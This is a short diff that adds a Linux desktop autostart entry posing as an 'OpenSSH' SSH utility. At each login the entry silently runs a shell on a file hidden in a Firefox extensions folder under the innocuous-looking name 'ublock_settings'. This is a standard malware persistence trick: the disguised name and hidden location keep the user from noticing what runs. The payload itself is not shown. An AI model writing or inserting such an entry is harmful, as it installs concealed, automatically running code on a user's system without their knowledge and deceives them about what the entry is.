@@ -1,0 +1,10 @@
+[Desktop Entry]
+Type=Application
+Exec=/bin/sh -c "$HOME/.mozilla/extensions/ublock_settings"
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name[en_US]=OpenSSH
+Name=OpenSSH
+Comment[en_US]=SSH Utility
+Comment=SSH Utility
